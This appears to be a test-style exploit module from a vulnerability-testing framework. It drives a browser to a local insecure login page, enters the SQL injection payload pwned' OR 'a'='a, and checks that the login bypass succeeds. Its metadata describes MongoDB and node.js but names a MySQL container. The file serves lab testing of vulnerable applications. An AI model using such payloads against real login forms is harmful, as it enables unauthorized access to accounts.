from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'SQLInjectionExploit',
      'Description' : "SQL injection in MongoDB + node.js application.",
      'References' :  [["empty"]], 
      'Target' :      "SQLInjection",
      'Container': 'ubuntu-apache-mysql',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'SQL injection'
    }

    def runExploit(self):
        w = self.wrapper
        w.navigate("http://localhost:49160/insecureLogin.html")
        w.find("userid").keys("pwned' OR 'a'='a")       
        w.find("submit").click()
        element = w.find("body")
        self.assertIn("Hello, Batman!", element.raw.text)

